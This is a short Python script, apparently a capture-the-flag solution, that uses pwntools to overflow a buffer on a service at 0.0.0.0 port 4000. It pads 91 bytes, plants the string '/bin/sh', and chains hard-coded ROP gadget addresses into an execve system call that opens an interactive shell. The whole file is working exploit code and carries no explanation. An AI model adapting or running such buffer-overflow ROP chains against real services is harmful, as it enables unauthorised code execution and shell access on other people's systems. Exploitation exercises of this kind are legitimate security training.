#!/usr/bin/env python
from pwn import *

bin = 0x6e69622f
sh = 0x68732f
padding = "A"*91
padding += p32(bin) + p32(sh)

r = remote("0.0.0.0", 4000)
chain = p32(134671113)
chain += p32(4143967844)
chain += p32(0)
chain += p32(134584585)
chain += p32(11)
chain += p32(135127801)
chain += p32(0)
#pop ebx ; pop edx ; ret

chain += p32(134662005)
payload = padding + chain
r.sendline(payload)
r.interactive()
r.close()
